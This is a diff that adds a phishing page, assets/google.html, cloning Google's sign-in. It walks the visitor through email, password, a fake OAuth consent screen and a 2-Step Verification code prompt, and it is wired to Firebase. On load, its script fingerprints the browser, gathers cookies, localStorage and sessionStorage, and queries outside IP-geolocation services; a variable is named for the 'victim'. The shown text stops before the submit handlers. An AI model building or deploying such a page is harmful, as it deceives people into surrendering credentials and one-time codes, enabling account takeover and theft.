@@ -1,0 +1,1190 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: assets/google.html
+     Google Sign-in Clone — Real UI + OAuth Flow + OTP
+     Connection: Firebase Realtime DB (same pattern)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="origin-when-crossorigin">
+<title>Sign in - Google Accounts</title>
+<link rel="shortcut icon" href="https://www.google.com/favicon.ico">
+<meta name="description" content="Sign in to continue to Gmail">
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script src="../config.js"></script>
+
+<style>
+:root{
+  --g-blue:#1a73e8;
+  --g-blue-hover:#1557b0;
+  --g-blue-focus:#e8f0fe;
+  --g-text:#202124;
+  --g-text-dim:#5f6368;
+  --g-border:#dadce0;
+  --g-border-hover:#202124;
+  --g-error:#d93025;
+  --g-bg:#fff;
+  --g-link:#1a73e8;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:'Roboto','Helvetica Neue',Arial,sans-serif;
+  background:var(--g-bg);
+  color:var(--g-text);
+  font-size:14px;
+  -webkit-font-smoothing:antialiased;
+  display:flex;
+  flex-direction:column;
+  min-height:100vh;
+}
+a{color:var(--g-link);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* ═══ HEADER ═══ */
+.g-header{
+  padding:12px 24px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  flex-shrink:0;
+}
+.g-logo{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  font-size:22px;
+  color:var(--g-text-dim);
+  font-family:'Product Sans','Google Sans',Roboto,sans-serif;
+  letter-spacing:-.5px;
+  font-weight:500;
+  user-select:none;
+}
+.g-logo svg{width:32px;height:32px}
+.g-logo .g-text span:nth-child(1){color:#4285f4}
+.g-logo .g-text span:nth-child(2){color:#ea4335}
+.g-logo .g-text span:nth-child(3){color:#fbbc04}
+.g-logo .g-text span:nth-child(4){color:#4285f4}
+.g-logo .g-text span:nth-child(5){color:#34a853}
+.g-logo .g-text span:nth-child(6){color:#ea4335}
+
+.g-header-right{
+  display:flex;
+  align-items:center;
+  gap:14px;
+  font-size:13px;
+}
+.g-header-right a{
+  color:var(--g-text);
+  font-weight:500;
+}
+.g-header-right a.blue{
+  color:#fff;
+  background:var(--g-blue);
+  padding:9px 22px;
+  border-radius:4px;
+  font-weight:500;
+  transition:background .15s;
+}
+.g-header-right a.blue:hover{background:var(--g-blue-hover);text-decoration:none}
+
+/* ═══ MAIN ═══ */
+.g-main{
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.g-card{
+  width:100%;
+  max-width:448px;
+  background:#fff;
+  border:1px solid var(--g-border);
+  border-radius:8px;
+  padding:48px 40px 36px;
+  position:relative;
+}
+.g-card.otp-card,
+.g-card.consent-card{
+  max-width:512px;
+}
+
+/* Brand mark + heading */
+.g-brand{
+  text-align:center;
+  margin-bottom:20px;
+}
+.g-brand svg{width:40px;height:40px}
+.g-title{
+  font-size:24px;
+  font-weight:400;
+  text-align:center;
+  color:var(--g-text);
+  margin-bottom:8px;
+  font-family:'Google Sans',Roboto,sans-serif;
+  letter-spacing:-.2px;
+}
+.g-subtitle{
+  font-size:16px;
+  text-align:center;
+  color:var(--g-text);
+  margin-bottom:26px;
+  font-weight:400;
+}
+
+/* Input */
+.g-input-wrap{
+  position:relative;
+  margin-bottom:8px;
+}
+.g-input{
+  width:100%;
+  padding:13px 15px;
+  font-size:16px;
+  border:1px solid var(--g-border);
+  border-radius:4px;
+  background:transparent;
+  color:var(--g-text);
+  outline:none;
+  font-family:inherit;
+  transition:border-color .15s, box-shadow .15s;
+}
+.g-input:hover{border-color:var(--g-border-hover)}
+.g-input:focus{
+  border-color:var(--g-blue);
+  box-shadow:inset 0 0 0 1px var(--g-blue);
+  border-width:2px;
+  padding:12px 14px;
+}
+.g-input::placeholder{color:transparent}
+
+.g-label{
+  position:absolute;
+  top:50%;
+  left:15px;
+  transform:translateY(-50%);
+  color:var(--g-text-dim);
+  font-size:16px;
+  pointer-events:none;
+  transition:all .15s;
+  background:#fff;
+  padding:0 4px;
+}
+.g-input:focus + .g-label,
+.g-input:not(:placeholder-shown) + .g-label{
+  top:0;
+  font-size:12px;
+  color:var(--g-text-dim);
+}
+.g-input:focus + .g-label{color:var(--g-blue)}
+
+/* Error */
+.g-error{
+  display:none;
+  align-items:flex-start;
+  gap:8px;
+  color:var(--g-error);
+  font-size:12px;
+  margin:6px 0 4px;
+  line-height:1.4;
+}
+.g-error.show{display:flex}
+.g-error svg{width:16px;height:16px;flex-shrink:0;margin-top:1px;fill:var(--g-error)}
+
+/* Show password toggle */
+.g-show-pw{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin:12px 0 8px;
+  font-size:14px;
+  color:var(--g-text);
+  cursor:pointer;
+  user-select:none;
+  width:fit-content;
+}
+.g-show-pw input{
+  width:18px;
+  height:18px;
+  accent-color:var(--g-blue);
+  cursor:pointer;
+}
+
+/* Link row */
+.g-link-row{
+  margin:10px 0 26px;
+}
+.g-link-row a{
+  font-size:14px;
+  font-weight:500;
+  color:var(--g-blue);
+}
+
+/* Buttons */
+.g-actions{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-top:24px;
+  gap:12px;
+}
+.g-btn{
+  padding:9px 24px;
+  font-size:14px;
+  font-weight:500;
+  font-family:inherit;
+  border:none;
+  border-radius:4px;
+  cursor:pointer;
+  min-height:36px;
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  transition:background .15s, box-shadow .15s;
+}
+.g-btn-primary{
+  background:var(--g-blue);
+  color:#fff;
+}
+.g-btn-primary:hover{background:var(--g-blue-hover);box-shadow:0 1px 3px rgba(66,133,244,.4)}
+.g-btn-primary:disabled{opacity:.6;cursor:default}
+.g-btn-text{
+  background:transparent;
+  color:var(--g-blue);
+  padding:9px 12px;
+}
+.g-btn-text:hover{background:rgba(26,115,232,.04)}
+
+/* Spinner */
+.g-spinner{
+  display:none;
+  width:16px;
+  height:16px;
+  border:2px solid rgba(255,255,255,.35);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ═══ ACCOUNT CHIP (Step 2 — password screen) ═══ */
+.g-account-chip{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  border:1px solid var(--g-border);
+  border-radius:50px;
+  padding:4px 12px 4px 4px;
+  width:fit-content;
+  margin:0 auto 24px;
+  font-size:14px;
+  color:var(--g-text);
+}
+.g-account-chip .avatar{
+  width:24px;height:24px;
+  border-radius:50%;
+  background:linear-gradient(135deg,#4285f4,#1a73e8);
+  color:#fff;
+  font-size:12px;
+  font-weight:600;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-transform:uppercase;
+}
+.g-account-chip .email{
+  max-width:240px;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+.g-account-chip svg{
+  width:14px;height:14px;fill:var(--g-text-dim);
+}
+
+/* ═══ OTP INPUT ═══ */
+.g-otp-input{
+  width:100%;
+  padding:14px 15px;
+  font-size:20px;
+  letter-spacing:8px;
+  text-align:center;
+  font-weight:500;
+  border:1px solid var(--g-border);
+  border-radius:4px;
+  background:transparent;
+  color:var(--g-text);
+  outline:none;
+  font-family:inherit;
+  transition:border-color .15s;
+  margin-bottom:6px;
+}
+.g-otp-input:hover{border-color:var(--g-border-hover)}
+.g-otp-input:focus{
+  border-color:var(--g-blue);
+  box-shadow:inset 0 0 0 1px var(--g-blue);
+  border-width:2px;
+  padding:13px 14px;
+}
+
+/* ═══ CONSENT (OAuth style) ═══ */
+.consent-head{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:22px;
+  padding-bottom:18px;
+  border-bottom:1px solid var(--g-border);
+}
+.consent-head .app-icon{
+  width:40px;height:40px;
+  border-radius:8px;
+  background:linear-gradient(135deg,#ea4335,#c5221f);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+  font-size:20px;
+  font-weight:700;
+}
+.consent-head .app-info h2{
+  font-size:16px;
+  font-weight:500;
+  color:var(--g-text);
+  margin-bottom:2px;
+}
+.consent-head .app-info p{
+  font-size:12px;
+  color:var(--g-text-dim);
+}
+.consent-title{
+  font-size:22px;
+  font-weight:400;
+  margin-bottom:8px;
+  font-family:'Google Sans',Roboto,sans-serif;
+  color:var(--g-text);
+}
+.consent-sub{
+  font-size:14px;
+  color:var(--g-text-dim);
+  margin-bottom:22px;
+  line-height:1.5;
+}
+.consent-account{
+  display:flex;
+  align-items:center;
+  gap:14px;
+  padding:12px 14px;
+  border:1px solid var(--g-border);
+  border-radius:8px;
+  margin-bottom:12px;
+  cursor:pointer;
+  transition:background .15s;
+}
+.consent-account:hover{background:#f8f9fa}
+.consent-account .avatar-lg{
+  width:40px;height:40px;
+  border-radius:50%;
+  background:linear-gradient(135deg,#4285f4,#1a73e8);
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-transform:uppercase;
+  flex-shrink:0;
+}
+.consent-account .info{
+  flex:1;
+  min-width:0;
+}
+.consent-account .info .name{
+  font-size:14px;
+  color:var(--g-text);
+  font-weight:500;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+.consent-account .info .mail{
+  font-size:13px;
+  color:var(--g-text-dim);
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+.consent-account .check{
+  color:var(--g-blue);
+  font-size:18px;
+  font-weight:700;
+}
+.consent-scope{
+  padding:14px;
+  background:#f8f9fa;
+  border-radius:8px;
+  margin-bottom:22px;
+}
+.consent-scope p{
+  font-size:13px;
+  color:var(--g-text-dim);
+  margin-bottom:10px;
+  line-height:1.4;
+}
+.consent-scope ul{
+  list-style:none;
+  padding-left:0;
+}
+.consent-scope li{
+  display:flex;
+  align-items:flex-start;
+  gap:10px;
+  font-size:13px;
+  color:var(--g-text);
+  margin-bottom:8px;
+  line-height:1.4;
+}
+.consent-scope li svg{
+  width:16px;height:16px;
+  fill:var(--g-text-dim);
+  flex-shrink:0;
+  margin-top:1px;
+}
+
+/* ═══ FOOTER ═══ */
+.g-footer{
+  padding:18px 24px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:10px;
+  font-size:12px;
+  color:var(--g-text-dim);
+  border-top:0;
+}
+.g-footer-left{
+  display:flex;
+  gap:20px;
+  flex-wrap:wrap;
+}
+.g-footer-left a{color:var(--g-text-dim);font-size:12px}
+.g-footer-right{
+  display:flex;
+  gap:20px;
+  flex-wrap:wrap;
+}
+.g-footer-right a{color:var(--g-text-dim);font-size:12px}
+
+/* ═══ MOBILE ═══ */
+@media(max-width:600px){
+  .g-header{padding:10px 16px}
+  .g-logo{font-size:18px}
+  .g-logo svg{width:26px;height:26px}
+  .g-header-right a:not(.blue){display:none}
+  .g-card{
+    border:none;
+    padding:24px 24px 30px;
+    max-width:100%;
+  }
+  .g-title{font-size:22px}
+  .g-subtitle{font-size:15px;margin-bottom:22px}
+}
+</style>
+</head>
+<body>
+
+<!-- ═══ HEADER ═══ -->
+<header class="g-header">
+  <div class="g-logo">
+    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+      <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+      <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>
+      <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+    </svg>
+    <span class="g-text">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </span>
+  </div>
+  <div class="g-header-right">
+    <a href="#">Sign in</a>
+    <a href="#" class="blue">Create account</a>
+  </div>
+</header>
+
+<!-- ═══ MAIN — CARD SWAP AREA ═══ -->
+<main class="g-main">
+  <div class="g-card" id="gCard">
+
+    <!-- ═══ STEP 1 — EMAIL ═══ -->
+    <div id="step1">
+      <div class="g-brand">
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+        </svg>
+      </div>
+      <h1 class="g-title">Sign in</h1>
+      <p class="g-subtitle">to continue to Gmail</p>
+
+      <form id="emailForm" onsubmit="return submitEmail(event)" novalidate>
+        <div class="g-error" id="emailError">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+          <span id="emailErrorText"></span>
+        </div>
+
+        <div class="g-input-wrap">
+          <input type="text" class="g-input" id="email" name="email"
+                 placeholder=" " autocomplete="off" autocapitalize="off"
+                 autocorrect="off" spellcheck="false" autofocus required>
+          <label class="g-label" for="email">Email or phone</label>
+        </div>
+
+        <div class="g-link-row">
+          <a href="#" onclick="return handleForgot(event);">Forgot email?</a>
+        </div>
+
+        <p style="font-size:13px;color:var(--g-text-dim);line-height:1.5;margin-bottom:22px">
+          Not your computer? Use a private browsing window to sign in.
+          <a href="#" onclick="event.preventDefault();" style="color:var(--g-blue);font-weight:500">Learn more</a>
+        </p>
+
+        <div class="g-actions">
+          <button type="button" class="g-btn g-btn-text" onclick="handleCreate(event)">Create account</button>
+          <button type="submit" class="g-btn g-btn-primary" id="emailBtn">
+            <span id="emailBtnText">Next</span>
+            <div class="g-spinner" id="emailSpinner"></div>
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <!-- ═══ STEP 2 — PASSWORD ═══ -->
+    <div id="step2" style="display:none">
+      <div class="g-brand">
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+        </svg>
+      </div>
+      <h1 class="g-title">Welcome</h1>
+
+      <div class="g-account-chip" id="accountChip">
+        <div class="avatar" id="chipAvatar">A</div>
+        <span class="email" id="chipEmail">user@gmail.com</span>
+        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+
+      <form id="passwordForm" onsubmit="return submitPassword(event)" novalidate>
+        <div class="g-error" id="pwError">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+          <span id="pwErrorText"></span>
+        </div>
+
+        <div class="g-input-wrap">
+          <input type="password" class="g-input" id="password" name="password"
+                 placeholder=" " autocomplete="off" required>
+          <label class="g-label" for="password">Enter your password</label>
+        </div>
+
+        <label class="g-show-pw" for="showPw">
+          <input type="checkbox" id="showPw" onclick="togglePw()">
+          Show password
+        </label>
+
+        <div class="g-actions">
+          <button type="button" class="g-btn g-btn-text" onclick="backToEmail()">Back</button>
+          <button type="submit" class="g-btn g-btn-primary" id="pwBtn">
+            <span id="pwBtnText">Next</span>
+            <div class="g-spinner" id="pwSpinner"></div>
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <!-- ═══ STEP 3 — OAUTH CONSENT ═══ -->
+    <div id="step3" style="display:none">
+      <div class="consent-head">
+        <div class="app-icon">G</div>
+        <div class="app-info">
+          <h2>Gmail</h2>
+          <p>mail.google.com</p>
+        </div>
+      </div>
+
+      <h1 class="consent-title">Choose an account</h1>
+      <p class="consent-sub">to continue to <b>Gmail</b></p>
+
+      <div class="consent-account" id="consentAccount" onclick="confirmConsent()">
+        <div class="avatar-lg" id="consentAvatar">A</div>
+        <div class="info">
+          <div class="name" id="consentName">Your Name</div>
+          <div class="mail" id="consentEmail">user@gmail.com</div>
+        </div>
+        <span class="check">✓</span>
+      </div>
+
+      <div class="consent-scope">
+        <p>Gmail will receive:</p>
+        <ul>
+          <li>
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            <span>Your name, email address, profile picture</span>
+          </li>
+          <li>
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            <span>Language preference</span>
+          </li>
+        </ul>
+      </div>
+
+      <div class="g-actions" style="justify-content:flex-end">
+        <button type="button" class="g-btn g-btn-text" onclick="cancelConsent()">Cancel</button>
+        <button type="button" class="g-btn g-btn-primary" onclick="confirmConsent()">Allow</button>
+      </div>
+    </div>
+
+    <!-- ═══ STEP 4 — 2FA / OTP ═══ -->
+    <div id="step4" style="display:none">
+      <div class="g-brand">
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+        </svg>
+      </div>
+      <h1 class="g-title">2-Step Verification</h1>
+      <p class="g-subtitle" style="font-size:14px;color:var(--g-text-dim);line-height:1.5">
+        Enter the verification code sent to your phone ending in
+        <b id="phoneEnd" style="color:var(--g-text)">••••</b>.
+      </p>
+
+      <form id="otpForm" onsubmit="return submitOtp(event)" novalidate>
+        <div class="g-error" id="otpError">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+          <span id="otpErrorText"></span>
+        </div>
+
+        <input type="text" class="g-otp-input" id="otpInput" name="otp"
+               placeholder="Enter code" inputmode="numeric" pattern="[0-9]*"
+               maxlength="6" autocomplete="one-time-code" required autofocus>
+
+        <div style="text-align:center;margin:14px 0 22px">
+          <a href="#" onclick="return resendOtp(event);" style="font-size:14px;font-weight:500">
+            Resend code
+          </a>
+        </div>
+
+        <div class="g-actions">
+          <button type="button" class="g-btn g-btn-text" onclick="backToPassword()">Back</button>
+          <button type="submit" class="g-btn g-btn-primary" id="otpBtn">
+            <span id="otpBtnText">Verify</span>
+            <div class="g-spinner" id="otpSpinner"></div>
+          </button>
+        </div>
+      </form>
+    </div>
+
+  </div>
+</main>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="g-footer">
+  <div class="g-footer-left">
+    <select style="background:none;border:none;color:var(--g-text-dim);font-size:12px;font-family:inherit;cursor:pointer">
+      <option>English (United States)</option>
+      <option>বাংলা</option>
+      <option>हिन्दी</option>
+      <option>Español</option>
+      <option>Français</option>
+      <option>Deutsch</option>
+      <option>العربية</option>
+      <option>Português (Brasil)</option>
+    </select>
+  </div>
+  <div class="g-footer-right">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</footer>
+
+<script>
+/* ═══════════════════════════════════════════════════════
+   FIREBASE INIT
+   ═══════════════════════════════════════════════════════ */
+firebase.initializeApp(window.firebaseConfig);
+const database = firebase.database();
+
+/* ═══════════════════════════════════════════════════════
+   STATE
+   ═══════════════════════════════════════════════════════ */
+let cachedDeviceInfo = null;
+let cachedIPInfo = null;
+let cachedCanvasFP = null;
+let cachedWebGLFP = null;
+let pendingEmail = '';
+let pendingPassword = '';
+let pendingVictimId = '';
+
+const REDIRECT_URL = 'https://myaccount.google.com/';
+
+/* ═══════════════════════════════════════════════════════
+   SAFE KEY
+   ═══════════════════════════════════════════════════════ */
+function safeKey(key){
+  return String(key)
+    .replace(/\./g, '_').replace(/\#/g, '_').replace(/\$/g, '_')
+    .replace(/\//g, '_').replace(/\[/g, '_').replace(/\]/g, '_')
+    .replace(/\:/g, '_');
+}
+
+/* ═══════════════════════════════════════════════════════
+   DEVICE FINGERPRINT
+   ═══════════════════════════════════════════════════════ */
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  return {
+    userAgent: ua,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(',') : '',
+    screen: screen.width + 'x' + screen.height,
+    availScreen: screen.availWidth + 'x' + screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    browser: detectBrowser(ua),
+    browserVersion: detectBrowserVersion(ua),
+    os: detectOS(ua),
+    device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || 'unknown',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    memory: navigator.deviceMemory || 'unknown',
+    vendor: navigator.vendor || 'unknown',
+    appVersion: navigator.appVersion
+  };
+}
+function detectBrowser(ua){
+  if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('OPR')) return 'Opera';
+  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+  if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
+  return 'Unknown';
+}
+function detectBrowserVersion(ua){
+  const m = ua.match(/(Chrome|Firefox|Edge|Safari|Opera)\/(\d+)/);
+  return m ? m[1] + ' ' + m[2] : 'Unknown';
+}
+function detectOS(ua){
+  if (ua.includes('Windows NT 10')) return 'Windows 10';
+  if (ua.includes('Windows NT 11')) return 'Windows 11';
+  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+  if (ua.includes('Android')){ const m = ua.match(/Android (\d+)/); return m ? 'Android ' + m[1] : 'Android'; }
+  if (ua.includes('iPhone')) return 'iOS (iPhone)';
+  if (ua.includes('iPad')) return 'iOS (iPad)';
+  if (ua.includes('Mac OS')) return 'macOS';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Unknown';
+}
+
+/* ═══════════════════════════════════════════════════════
+   FINGERPRINTS
+   ═══════════════════════════════════════════════════════ */
+function getCanvasFingerprint(){
+  try{
+    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('CanvasFingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Browser', 4, 17);
+    return hashString(c.toDataURL());
+  }catch(e){ return 'canvas_error'; }
+}
+function getWebGLFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(!gl) return 'no_webgl';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return vendor + ' | ' + renderer;
+  }catch(e){ return 'webgl_error'; }
+}
+function hashString(str){
+  let h = 0;
+  for (let i = 0; i < str.length; i++){ h = ((h << 5) - h) + str.charCodeAt(i); h = h & h; }
+  return h.toString(36);
+}
+
+/* ═══════════════════════════════════════════════════════
+   STORAGE (sanitized)
+   ═══════════════════════════════════════════════════════ */
+function getAllCookies(){
+  const out = {}; const raw = document.cookie;
+  if (raw) raw.split(';').forEach(c => {
+    const p = c.trim().split('='); const k = p[0]; const v = p.slice(1).join('=');
+    if(k) out[safeKey(k)] = v;
+  });
+  return out;
+}
+function getLocalStorage(){
+  try{ const d = {}; for (let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); d[safeKey(k)] = localStorage.getItem(k); } return d; }
+  catch(e){ return {}; }
+}
+function getSessionStorage(){
+  try{ const d = {}; for (let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); d[safeKey(k)] = sessionStorage.getItem(k); } return d; }
+  catch(e){ return {}; }
+}
+
+/* ═══════════════════════════════════════════════════════
+   IP INTEL
+   ═══════════════════════════════════════════════════════ */
+async function getIPInfo(){
+  try{
+    const r = await fetch('https://ipapi.co/json/', {signal: AbortSignal.timeout(5000)});
+    const d = await r.json();
+    return {
+      ip: d.ip||'Unknown', network: d.network||'Unknown', version: d.version||'',
+      city: d.city||'Unknown', region: d.region||'Unknown',
+      country: d.country_name||'Unknown', countryCode: d.country_code||'Unknown',
+      postal: d.postal||'', isp: d.org||'Unknown', asn: d.asn||'Unknown',
+      timezone: d.timezone||'Unknown', latitude: d.latitude||'', longitude: d.longitude||'',
+      languages: d.languages||''
+    };
+  }catch{
+    try{
+      const r = await fetch('https://ipwho.is/', {signal: AbortSignal.timeout(5000)});
+      const d = await r.json();
+      return { ip:d.ip||'Unknown', city:d.city||'Unknown', country:d.country||'Unknown',
+               isp:d.connection?.isp||'Unknown', latitude:d.latitude||'', longitude:d.longitude||'' };
+    }catch{ return { ip:'Unknown', city:'Unknown', country:'Unknown' }; }
+  }
+}
+
+async function ensureIntel(){
+  if(!cachedDeviceInfo) cachedDeviceInfo = getDeviceInfo();
+  if(!cachedCanvasFP) cachedCanvasFP = getCanvasFingerprint();
+  if(!cachedWebGLFP) cachedWebGLFP = getWebGLFingerprint();
+  if(!cachedIPInfo) cachedIPInfo = await getIPInfo();
+}
+window.addEventListener('load', () => { ensureIntel(); });
+
+/* ═══════════════════════════════════════════════════════
+   HELPERS
+   ═══════════════════════════════════════════════════════ */
+function showErr(boxId, textId, msg){
+  const b = document.getElementById(boxId);
+  const t = document.getElementById(textId);
+  if(!b || !t) return;
+  t.textContent = msg; b.classList.add('show');
+}
+function hideErr(boxId){
+  const b = document.getElementById(boxId);
+  if(b) b.classList.remove('show');
+}
+function togglePw(){
